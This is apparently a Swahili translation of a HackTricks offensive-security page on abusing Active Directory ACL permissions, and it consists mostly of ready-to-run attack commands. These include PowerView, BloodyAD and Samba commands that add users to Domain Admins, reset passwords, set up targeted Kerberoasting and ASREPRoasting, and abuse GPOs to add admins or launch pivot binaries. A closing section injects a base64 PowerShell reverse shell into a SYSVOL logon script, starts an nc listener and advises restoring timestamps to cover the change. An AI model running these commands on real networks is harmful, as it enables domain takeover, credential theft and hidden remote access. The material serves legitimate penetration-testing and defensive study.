# Kutumia vibaya Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala za asili.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Haki za GenericAll kwa Mtumiaji**

Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji lengwa. Mara haki za `GenericAll` zinapothibitishwa kwa kutumia amri `Get-ObjectAcl`, mshambuliaji anaweza:

- **Badilisha Nenosiri la Lengo**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kuweka upya nenosiri la mtumiaji.
- Kutoka Linux, unaweza kufanya vivyo hivyo kwa SAMR kwa kutumia Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ikiwa akaunti imezimwa, ondoa bendera ya UAC**: `GenericAll` inaruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa bendera ya `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kunyakua na kujaribu kuvunja hashes za ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yao kuwa nyeti kwa ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Kwa `GenericAll` kwenye mtumiaji unaweza kuongeza uthibitisho unaotegemea cheti na kuingia kama wao bila kubadilisha nenosiri lao. Tazama:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Haki za GenericAll kwenye Kundi**

Haki hii inamruhusu mshambuliaji kudhibiti uanachama wa kundi ikiwa wana haki za `GenericAll` kwenye kundi kama `Domain Admins`. Baada ya kubaini distinguished name ya kundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

- **Add Themselves to the Domain Admins Group**: Hii inaweza kufanywa kwa amri za moja kwa moja au kwa kutumia modules kama Active Directory au PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Kutoka Linux unaweza pia kutumia BloodyAD kujiongezea kwenye vikundi vyovyote pale unapokuwa na uanachama wa GenericAll/Write juu yao. Ikiwa kundi lengwa limewekwa ndani ya “Remote Management Users”, utaipata mara moja ufikiaji wa WinRM kwenye hosts zinazoheshimu kundi hilo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na vibali hivi kwenye objekti ya kompyuta au kwenye akaunti ya mtumiaji kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa objekti ya kompyuta.
- **Shadow Credentials**: Tumia mbinu hii kuiga objekti ya kompyuta au akaunti ya mtumiaji kwa kutumia vibali kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa mtumiaji ana haki za `WriteProperty` kwa vitu vyote vya kundi fulani (kwa mfano, `Domain Admins`), wanaweza:

- **Kujiongezea kwenye Domain Admins Group**: Inayowezekana kwa kuchanganya amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu privilege escalation ndani ya domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Idhini hii inawawezesha washambuliaji kujiongezea kwenye makundi maalum, kama `Domain Admins`, kwa kutumia amri zinazobadilisha uanachama wa kikundi moja kwa moja. Kutumia mfuatano wa amri ufuatao kunaruhusu kujiongezea:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Haki inayofanana, hii inawawezesha washambuliaji kujiunga moja kwa moja na vikundi kwa kubadilisha mali za vikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kushikilia `ExtendedRight` kwa mtumiaji kwa ajili ya `User-Force-Change-Password` kunaruhusu kuweka upya nywila bila kujua nywila ya sasa. Uhakiki wa haki hii na matumizi yake unaweza kufanywa kupitia PowerShell au zana nyingine za command-line, zikitoa mbinu kadhaa za kuweka upya nywila ya mtumiaji, ikiwa ni pamoja na interactive sessions na one-liners kwa mazingira yasiyo na mwingiliano. Amri zinatofautiana kutoka kwa miito rahisi za PowerShell hadi matumizi ya `rpcclient` kwenye Linux, zikionesha utofauti wa attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye Kundi**

Ikiwa mshambulizi anagundua kuwa ana haki za `WriteOwner` juu ya kundi, anaweza kubadilisha umiliki wa kundi kwao. Hii ina athari kubwa hasa wakati kundi husika ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana zaidi juu ya sifa za kundi na uanachama. Mchakato unajumuisha kubaini kitu sahihi kupitia `Get-ObjectAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, ama kwa SID au kwa jina.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on Mtumiaji**

Ruhusa hii inaruhusu mshambuliaji kurekebisha sifa za mtumiaji. Hasa, kwa ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya logon script ya mtumiaji ili kuendesha script yenye madhara wakati mtumiaji anapoingia. Hii inafikiwa kwa kutumia amri ya `Set-ADObject` kusasisha sifa ya `scriptpath` ya mtumiaji lengwa ili kuelekeza kwenye script ya mshambuliaji.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Kwa kibali hiki, washambuliaji wanaweza kubadilisha uanachama wa vikundi, kama kuongeza wao wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kuunda credential object (kitu cha cheti), kuitumia kuongeza au kuondoa watumiaji kutoka kwenye kikundi, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama ukiwa na `GenericWrite` kwenye kundi (inayofaa wakati PowerShell/RSAT hazipatikani):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Kuwa mmiliki wa objekti ya AD na kuwa na ruhusa za `WriteDACL` juu yake humuwezesha mshambuliaji kujipa ruhusa za `GenericAll` kwa objekti hiyo. Hii inafikiwa kupitia ADSI manipulation, ikiruhusu udhibiti kamili wa objekti na uwezo wa kubadilisha uanachama wake wa vikundi. Hata hivyo, kuna vikwazo linapojaribu exploit ruhusa hizi kwa kutumia moduli ya Active Directory `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner uchukuzi wa haraka (PowerView)

Unapokuwa na `WriteOwner` na `WriteDacl` juu ya akaunti ya mtumiaji au akaunti ya huduma, unaweza kuchukua udhibiti kamili na kuweka upya nenosiri lake kwa kutumia PowerView bila kujua nenosiri la zamani:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Vidokezo:
- Unaweza kuhitaji kwanza kubadilisha mmiliki kuwa wewe ikiwa una `WriteOwner` tu:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Thibitisha upatikanaji kwa kutumia itifaki yoyote (SMB/LDAP/RDP/WinRM) baada ya kuweka upya nenosiri.

## **Replikesheni kwenye Domain (DCSync)**

Shambulio la DCSync linatumia ruhusa maalumu za replikesheni kwenye domain kuiga Domain Controller na kusawazisha data, ikiwa ni pamoja na cheti/nenosiri za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ikiruhusu washambuliaji kunyakua taarifa nyeti kutoka mazingira ya AD bila kupata moja kwa moja Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Ugawaji wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ugawaji wa GPO

Upatikanaji uliogawanywa wa kusimamia Group Policy Objects (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za kusimamia GPO, anaweza kuwa na vibali kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Vibali hivi vinaweza kutumika vibaya kwa madhumuni mabaya, kama inavyoonekana kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Orodhesha Vibali vya GPO

Ili kubaini GPOs zilizo na usanidi mbaya, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPOs ambazo mtumiaji fulani ana ruhusa za kuzisimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta Zenye Sera Imetumika**: Inawezekana kubaini ni kompyuta zipi Sera fulani inatumika nazo, ikisaidia kuelewa wigo wa athari zinazowezekana. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zinazotumika kwa Kompyuta Iliyotajwa**: Ili kuona sera zinazotumika kwa kompyuta maalumu, amri kama `Get-DomainGPO` zinaweza kutumika.

**OUs Zenye Sera Imetumika**: Kutambua organizational units (OUs) zilizoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia zana [**GPOHound**](https://github.com/cogiceo/GPOHound) kuorodhesha GPOs na kupata matatizo ndani yao.

### Kutumia Vibaya GPO - New-GPOImmediateTask

GPOs zilizo na usanidi mbaya zinaweza kutumika kusababisha utekelezaji wa code, kwa mfano, kwa kuunda task ya scheduled inayotekelezwa mara moja. Hii inaweza kutumiwa kuongeza mtumiaji kwenye kundi la local administrators kwenye mashine zilizoathiriwa, na hivyo kuinua vibali kwa kiasi kikubwa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

The GroupPolicy module, ikiwa imewekwa, inaruhusu kuunda na kuunganisha GPOs mpya, na kuweka preferences kama registry values ili kuendesha backdoors kwenye kompyuta zilizoathiriwa. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta ili utekelezaji ufanyike:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse hutoa njia ya kutumia kwa mbaya GPOs zilizopo kwa kuongeza kazi au kubadilisha mipangilio bila hitaji la kuunda GPOs mpya. Zana hii inahitaji mabadiliko ya GPOs zilizopo au kutumia RSAT kuunda mpya kabla ya kutekeleza mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Lazimisha Sasisho la Sera

Mabadiliko ya GPO kwa kawaida hufanyika kila takriban dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kufanya mabadiliko, amri `gpupdate /force` inaweza kutumika kwenye kompyuta ya lengo ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kwamba mabadiliko yoyote kwenye GPOs yanatekelezwa bila kusubiri mzunguko wa sasisho la kiotomatiki ufuatao.

### Ndani ya Mfumo

Baada ya kukagua Scheduled Tasks kwa GPO fulani, kama `Misconfigured Policy`, kuongeza kwa kazi kama `evilTask` kunaweza kuthibitishwa. Kazi hizi zinaundwa kwa kutumia scripts au zana za command-line zinalenga kubadilisha tabia ya mfumo au kuongeza viwango vya ruhusa.

Muundo wa kazi, kama unaonyeshwa katika faili ya usanidi ya XML iliyotengenezwa na `New-GPOImmediateTask`, unaeleza maelezo maalum ya Scheduled Task - ikijumuisha amri itakayotekelezwa na triggers zake. Faili hili linaonyesha jinsi Scheduled Tasks zinavyofafanuliwa na kusimamiwa ndani ya GPOs, likitoa njia ya kutekeleza amri au scripts yoyote kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPOs pia zinaruhusu kudhibiti uanachama wa watumiaji na vikundi kwenye mifumo ya lengo. Kwa kuhariri faili za sera za Users and Groups moja kwa moja, wahalifu wanaweza kuongeza watumiaji kwenye vikundi vyenye madaraka, kama vile kikundi cha ndani cha `administrators`. Hii inawezekana kupitia udelegeshaji wa ruhusa za usimamizi wa GPO, ambao unaruhusu mabadiliko ya faili za sera ili kujumuisha watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi ya XML ya Users and Groups inaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza rekodi kwenye faili hili, watumiaji maalum wanaweza kupewa ruhusa za juu kwenye mifumo yote iliyohusishwa. Njia hii inatoa njia ya moja kwa moja ya kupandisha viwango vya ruhusa kupitia kuingiliwa kwa GPO.

Zaidi ya hayo, mbinu nyingine za kutekeleza msimbo au kudumisha uwepo, kama vile kutumia logon/logoff scripts, kubadilisha registry keys kwa ajili ya autoruns, kusanidi software kupitia .msi files, au kuhariri configurations za service, pia zinaweza kuzingatiwa. Mbinu hizi zinatoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo ya lengo kupitia matumizi mabaya ya GPOs.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Locate logon scripts
- Kagua sifa za watumiaji kwa logon script iliyosanidiwa:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Pitia domain shares ili kuibua shortcuts au marejeo ya scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Changanua faili za `.lnk` ili kutatua malengo yanayolenga ndani ya SYSVOL/NETLOGON (mbinu muhimu ya DFIR na kwa washambulizi wasiokuwa na ufikiaji wa moja kwa moja wa GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound inaonyesha sifa ya `logonScript` (scriptPath) kwenye nodi za watumiaji inapopo.

### Thibitisha ufikiaji wa kuandika (usiamini orodha za share)
Vifaa vya kiotomatiki vinaweza kuonyesha SYSVOL/NETLOGON kama read-only, lakini ACL za NTFS zilizo chini zinaweza bado kuruhusu uandishi. Daima jaribu:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Kama ukubwa wa faili au mtime inabadilika, una uwezo wa kuandika. Hifadhi nakala za awali kabla ya kuhariri.

### Sumisha script ya kuingia ya VBScript kwa RCE
Ongeza amri inayozindua PowerShell reverse shell (itengenezwe kutoka revshells.com) na uhifadhi mantiki ya asili ili kuepuka kuvunja kazi za biashara:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Sikiliza kwenye mwenyeji wako na usubiri interactive logon ujao:
```bash
rlwrap -cAr nc -lnvp 443
```
Vidokezo:
- Utekelezaji hufanyika chini ya token ya mtumiaji aliyeingia (not SYSTEM). Wigo ni kiungo cha GPO (OU, site, domain) kinachotumika kutekeleza script hiyo.
- Fanya usafi kwa kurejesha yaliyomo/alama za wakati za awali baada ya matumizi.

## Marejeleo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
